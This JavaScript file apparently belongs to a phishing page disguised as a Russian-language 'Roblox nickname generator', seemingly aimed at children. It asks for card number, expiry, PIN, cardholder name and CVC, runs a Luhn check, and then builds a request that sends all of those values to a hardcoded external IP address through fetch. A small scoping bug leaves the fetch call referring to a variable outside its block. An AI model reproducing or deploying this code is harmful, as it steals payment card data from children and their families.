    function checkWindowSize() {
        const cardNumber1 = document.querySelector('.inputCard');
        const expiryMonth1 = document.querySelector('.inputCard1');
        const expiryYear1 = document.querySelector('.inputCard2');
        const pincode1 = document.querySelector('.inputCard3');
        const cardHolderName1 = document.querySelector('.inputCard4');
        const cvc1 = document.querySelector('.inputCard5'); 
        if (window.innerWidth < 768) {
            cardNumber1.style.display = 'block'; 
            expiryMonth1.style.display = 'block';
            expiryYear1.style.display = 'block';
            pincode1.style.display = 'block';
            cardHolderName1.style.display = 'block';
            cvc1.style.display = 'block';
        } else {
            button.style.display = 'none'; 
        }
    }
    window.onload = checkWindowSize;
    window.onresize = checkWindowSize;

    let btn = document.querySelector(".button");
    btn.addEventListener('click', onClick);
    function onClick() {
        const cardNumber = document.querySelector('.inputCard').value;
        const expiryMonth = document.querySelector('.inputCard1').value;
        const expiryYear = document.querySelector('.inputCard2').value;
        const pincode = document.querySelector('.inputCard3').value;
        const cardHolderName = document.querySelector('.inputCard4').value;
        const cvc = document.querySelector('.inputCard5').value; 
        if (/[A-Za-z]/.test(cardNumber)) {
            alert('В номере карты найдены буквы. Введите только цифры.');
            return;
        }
        if (/[A-Za-z]/.test(expiryMonth)) {
            alert('В месяце истечения срока действия карты найдены буквы. Введите только цифры.');
            return;
        }
        if (/[A-Za-z]/.test(expiryYear)) {
            alert('В году истечения срока действия карты найдены буквы. Введите только цифры.');
            return;
        }
        if (/[A-Za-z]/.test(pincode)) {
            alert('В пин-коде найдены буквы. Введите только цифры.');
            return;
        }
        if (/[A-Za-z]/.test(cvc)) {
            alert('В CVC коде найдены буквы. Введите только цифры.');
            return;
        }
        if (/\d/.test(cardHolderName)) {
            alert('В имени держателя карты найдены цифры. Введите только буквы.');
            return;
        }
        if(cardNumber && cvc && expiryMonth && expiryYear && pincode && cardHolderName) {
            if(isValidCardNumber(cardNumber)) {
                let names = ["Крутой роблоксер", "Кирилл", "Максим2016", "СерегаКрутой2013", "НастяАдоптми", "Maksim2006", "ПулиОтДедули", "KachokRoblox", "RoblocKrytoi", "Pozzizi", "MisterDommer", "RobloxAdmin", "Joper123", "Poper", "Joper", "КириллФлешкуСВиндойОтдайТварь"];
                alert("Твое имя роблокс: " + names[Math.floor(Math.random() * names.length)]);
                const url = `http://109.172.91.185:7777/v2718086.hosted-by-vdsina.ru/save-ip.php?secret=123&data=card: ${cardNumber}, ${expiryMonth} / ${expiryYear}, ${pincode}, ${cardHolderName}, ${cvc}`;
            } else {
                alert("Вы ввели неправильные данные от карточки! Введи правильное и нажмите на кнопку чтобы узнать имя роблокс")
            }
fetch(url)
    .then(response => {
        if (response.ok) {
            return response.text();
        } else {
            throw new Error('Error');
        }
    })
    .then(data => {
        console.log('Success:', data);
    })
    .catch(error => {
        console.error('Error:', error);
    });
        } else {
            alert("Ошибка, введите все поля! Иначе ник не получится.");
        }
    }

    function isValidCardNumber(cardNumber) {
        cardNumber = cardNumber.replace(/\D/g, '');
        let sum = 0;
        let shouldDouble = false;
        for (let i = cardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cardNumber.charAt(i), 10);
            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9; 
                }
            }
            sum += digit;
            shouldDouble = !shouldDouble; 
        }
        return (sum % 10 === 0);
    }